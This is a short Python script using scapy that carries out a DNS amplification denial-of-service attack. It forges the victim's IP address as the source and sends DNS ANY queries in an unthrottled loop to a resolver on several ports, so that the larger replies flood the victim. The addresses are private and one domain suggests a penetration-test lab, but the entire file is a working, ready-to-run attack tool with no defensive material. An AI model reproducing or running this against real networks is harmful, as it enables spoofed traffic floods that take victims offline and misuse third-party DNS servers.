#!/usr/bin/env python3
"""
High-Speed DNS Amplification Attack
No delays - maximum packet rate
"""

from scapy.all import IP, UDP, DNS, DNSQR, send
import random
import sys

# Configuration
VICTIM_IP = "192.168.34.130"  # Windows NAT IP
RESOLVER_IP = "192.168.34.131"  # DNS Server NAT IP
RESOLVERS = [53, 5353, 8053, 9053]  # All ports
DOMAINS = ["google.com", "microsoft.com", "cloudflare.com", "amazon.com","www.dnspentest.lab"]

print("=" * 60)
print("HIGH-SPEED DNS AMPLIFICATION ATTACK")
print("=" * 60)
print(f"[+] Target: {VICTIM_IP}")
print(f"[+] Resolver: {RESOLVER_IP}")
print(f"[+] Ports: {RESOLVERS}")
print("[+] Press Ctrl+C to stop")
print("=" * 60)

packet_count = 0
try:
    while True:
        port = random.choice(RESOLVERS)
        domain = random.choice(DOMAINS)

        packet = IP(src=VICTIM_IP, dst=RESOLVER_IP) / \
                 UDP(sport=random.randint(1024, 65535), dport=port) / \
                 DNS(rd=1, qd=DNSQR(qname=domain, qtype=255))

        send(packet, verbose=False)
        packet_count += 1

        # Only show progress, no delay
        if packet_count % 1000 == 0:
            print(f"[+] Sent {packet_count} packets...")

except KeyboardInterrupt:
    print(f"\n[!] Attack stopped. Total: {packet_count}")